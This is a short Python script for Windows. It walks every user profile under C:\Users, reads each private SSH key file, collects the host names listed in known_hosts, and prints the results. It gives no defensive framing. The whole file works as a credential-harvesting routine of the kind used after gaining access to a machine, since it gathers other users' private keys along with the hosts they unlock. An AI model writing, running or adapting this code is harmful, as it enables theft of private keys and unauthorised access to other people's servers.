import os


def get_user_keys(userDir):
    ssh = {}
    keys = []
    sshDir = os.path.join(userDir, '.ssh')
    for i in os.listdir(sshDir):
        if 'id_' in i and '.pub' not in i:
            with open(os.path.join(sshDir, i), 'r') as f:
                keys.append(f.read())
        if i == 'known_hosts':
            with open(os.path.join(sshDir, i), 'r') as f:
                hosts = [i.split(" ")[0] for i in f.read().split("\n")]

    ssh['keys'] = keys
    ssh['hosts'] = hosts
    return ssh


def find_keys():
    keys = {}
    curUserDir = os.getenv('USERPROFILE')
    username = os.getlogin()
    bannedUsers = ['Public', 'Default', 'Default User', 'All Users', 'desktop.ini', username]
    if '.ssh' in os.listdir(curUserDir):
        keys[username] = get_user_keys(curUserDir)

    for user in os.listdir('C:\\Users'):
        if user not in bannedUsers:
            try:
                if '.ssh' in os.listdir(os.path.join('C:\\Users', user)):
                    keys[user] = get_user_keys(os.path.join('C:\\Users', user))
            except Exception as e:
                pass

    return keys


if __name__ == '__main__':
    print(find_keys())
